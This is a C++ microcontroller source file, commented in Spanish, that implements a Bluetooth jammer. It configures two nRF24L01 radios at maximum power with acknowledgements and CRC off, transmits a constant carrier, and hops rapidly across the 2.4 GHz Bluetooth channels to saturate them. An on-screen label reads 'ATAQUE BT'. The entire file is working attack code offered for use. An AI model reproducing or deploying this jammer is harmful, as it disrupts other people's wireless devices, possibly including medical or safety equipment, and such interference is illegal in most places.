#include "bt_jammer.h"
#include <RF24.h>
#include <U8g2lib.h>

extern RF24 jam1; 
extern RF24 jam2;
extern U8G2 u8g2;

#define BTN_OK 32
#define BTN_BACK 25

bool isBtJamming = false;
byte hopping_channel[] = { 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 52, 54, 56, 58, 60, 62, 64, 66, 68, 70, 72, 74, 76, 78, 80 };
int total_bt_chans = sizeof(hopping_channel);

void btJammerSetup() {
    jam1.begin(); jam2.begin();
    jam1.setAutoAck(false); jam1.setPALevel(RF24_PA_MAX, true);
    jam1.setDataRate(RF24_1MBPS); jam1.setCRCLength(RF24_CRC_DISABLED);
    jam2.setAutoAck(false); jam2.setPALevel(RF24_PA_MAX, true);
    jam2.setDataRate(RF24_1MBPS); jam2.setCRCLength(RF24_CRC_DISABLED);
}

void btJammerLoop() {
    if (digitalRead(BTN_OK) == LOW) { 
        isBtJamming = !isBtJamming; 
        if(!isBtJamming) { 
            jam1.stopConstCarrier(); jam2.stopConstCarrier(); 
        } else { 
            // DIBUJO ESTÁTICO (Solo una vez)
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(10, 30, ">>> ATAQUE BT <<<");
            u8g2.drawStr(10, 45, "MODO: VELOCIDAD MAX");
            u8g2.sendBuffer(); 

            jam1.startConstCarrier(RF24_PA_MAX, hopping_channel[0]); 
            jam2.startConstCarrier(RF24_PA_MAX, hopping_channel[total_bt_chans-1]); 
        }
        delay(400); 
    }

    if (isBtJamming) {
        // --- BUCLE DE ALTA PRIORIDAD ---
        while(isBtJamming) {
            for (int i = 0; i < total_bt_chans; i++) {
                jam1.setChannel(hopping_channel[i]);
                jam2.setChannel(hopping_channel[total_bt_chans - 1 - i]);
                // Sin delays, sin dibujos. Solo saturación de silicio.
            }
            // Check rápido de botones
            if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
                isBtJamming = false; jam1.stopConstCarrier(); jam2.stopConstCarrier(); return;
            }
        }
    } else {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "BT ATTACK");
        u8g2.drawStr(10, 40, "ESPECTRO BT LISTO");
        u8g2.sendBuffer();
    }
}